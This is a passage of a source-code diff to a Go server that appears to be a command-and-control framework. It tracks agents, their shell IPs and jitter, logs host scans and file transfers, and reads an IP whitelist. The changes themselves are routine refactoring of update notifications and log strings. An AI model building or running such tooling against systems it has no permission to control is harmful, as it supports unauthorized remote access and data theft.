-	go PushAgentData(uid, "GetMsgNet")
+	go PushAgentData(uid, "updateGetMsgNet")
 
 }
 
@@ -5128,7 +5470,7 @@ func put_conn(host, online_time, uid, shell_ip, host_key string) {
 	data_conn.Conns = append(data_conn.Conns, newConn)
 	dataConnMu.Unlock()
 
-	go PushData("", "listen")
+	go PushAgentData(uid, "updateListen")
 
 	log_str := fmt.Sprintf(log_word["request_host"], shell_ip, host, uid)
 	logger.WriteLog(log_str)
@@ -5145,7 +5487,7 @@ func (s *MyServer) PutServer(
 	defer serverDataMu.Unlock()
 	for i := range server_data.Servers {
 		server := &server_data.Servers[i]
-		if server.Port == port && server.Protocol == protocol {
+		if server.Port == port && server.Protocol == protocol && server.Remark == remark {
 			log.Printf("Server with port %v and protocol %v already exists.\n", port, protocol)
 			return false
 		}
@@ -5184,7 +5526,7 @@ func (s *MyServer) PutServer(
 
 	server_data.Servers = append(server_data.Servers, newServer)
 
-	go PushData("", "server")
+	go PushAgentData(port, "updateServer")
 
 	return true
 }
@@ -5246,13 +5588,15 @@ func Windows_put_client(username, host, osType, online_time, shell_ip, currentDi
 			client.SystemType = systemType
 			client.Architecture = arch
 
+			go PushAgentData(uid, "updateWinIndex")
+
 			return
 		}
 	}
 	// 如果不存在，则添加新客户端
 	windows_client_data.Clients = append(windows_client_data.Clients, newClient)
 
-	go PushData("", "winAgentList")
+	go PushAgentData(uid, "updateWinIndex")
 
 }
 
@@ -5292,12 +5636,15 @@ func put_client(username, host, osType, online_time, shell_ip, currentDir, versi
 			client.Jitter = jitter
 			client.Executable = executable
 			client.Proto = proto
+
+			go PushAgentData(uid, "updateIndex")
+
 			return
 		}
 	}
 	client_data.Clients = append(client_data.Clients, newClient)
 
-	go PushData("", "agentList")
+	go PushAgentData(uid, "updateIndex")
 
 }
 
@@ -5532,11 +5879,12 @@ func Read_log_word() {
         "scan_msg": "%v Scan host %s",
         "scan_result": "Host %s && %s received internal assets: [*%d...]",
         "download": "Host: [%s] file downloaded successfully: [%s]",
-        "download_part": "Host: [%s] downloading file: [%s], length: %v, part: %v",
+        "download_part": "Host: [%s] downloading file: [%s], bytes: %v, part: %v",
         "request_file": "Received a file upload request",
-        "request_file_part": "Received file part: %s, size: %dMB",
+        "request_file_part": "Received file part: %s, size: %d bytes",
         "request_file_part_": " ==== Received from user: %s, UID: %s, file: %s, part: %v, range: %d-%d",
-        "web_upload": "%v key does not exist",
+        "request_file_finish": " ==== Received from user: %s, UID: %s, file: %s, total size: %d bytes, file saved to: %s",
+		"web_upload": "%v key does not exist",
         "tmp_file": "%v failed to create temp file: %v",
         "write_tmp": "%v failed to write temp file: %v",
         "read_tmp": "%v failed to read temp file: %v",
@@ -5584,38 +5932,38 @@ func Read_log_word() {
 	}
 }
 func readWhitelist() ([]string, error) {
-    filePath := "white.config"
+	filePath := "white.config"
 
-    if _, err := os.Stat(filePath); os.IsNotExist(err) {
-        if err := os.WriteFile(filePath, []byte("127.0.0.1\n::1\n"), 0644); err != nil {
-            return nil, err
-        }
-    }
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		if err := os.WriteFile(filePath, []byte("127.0.0.1\n::1\n"), 0644); err != nil {
+			return nil, err
+		}
+	}
 
-    file, err := os.Open(filePath)
-    if err != nil {
-        return nil, err
-    }
-    defer file.Close()
+	file, err := os.Open(filePath)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
 
-    var whitelist []string
-    scanner := bufio.NewScanner(file)
+	var whitelist []string
+	scanner := bufio.NewScanner(file)
 
-    for scanner.Scan() {
-        line := strings.TrimSpace(scanner.Text())
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
 
-        if line == "" || strings.HasPrefix(line, "//") {
-            continue
-        }
+		if line == "" || strings.HasPrefix(line, "//") {
+			continue
+		}
 
-        whitelist = append(whitelist, line)
-    }
+		whitelist = append(whitelist, line)
+	}
 
-    if err := scanner.Err(); err != nil {
-        return nil, err
-    }
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
 
-    return whitelist, nil
+	return whitelist, nil
 }
 
 func writeWhitelist(whitelist []string) error {
